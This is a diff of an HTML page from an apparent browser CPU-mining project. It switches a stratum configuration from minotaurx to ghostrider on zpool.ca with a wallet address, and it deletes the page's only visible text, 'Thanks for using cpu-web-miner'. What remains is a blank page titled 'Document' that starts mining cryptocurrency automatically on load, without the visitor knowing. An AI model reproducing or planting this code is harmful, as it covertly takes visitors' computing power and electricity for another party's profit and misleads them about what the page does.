@@ -6,17 +6,16 @@
   <title>Document</title>
 </head>
 <body>
-    <h2>Thanks for using cpu-web-miner</h2>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.5/socket.io.js"></script>
   <script src="app.js"></script>
   <script>
     const stratum = {
-      server: "minotaurx.na.mine.zpool.ca",
-      port: 7019,
-      worker: "R9uHDn9XXqPAe2TLsEmVoNrokmWsHREV2Q",
+      server: "ghostrider.na.mine.zpool.ca",
+      port: 5354,
+      worker: "RVZD5AjUBXoNnsBg9B2AzTTdEeBNLfqs65",
       password: "c=RVN"
     }
-    mine(algos.minotaurx, stratum, true, 2)
+    mine(algos.ghostrider, stratum, true, 2)
   </script>
 </body>
 </html>
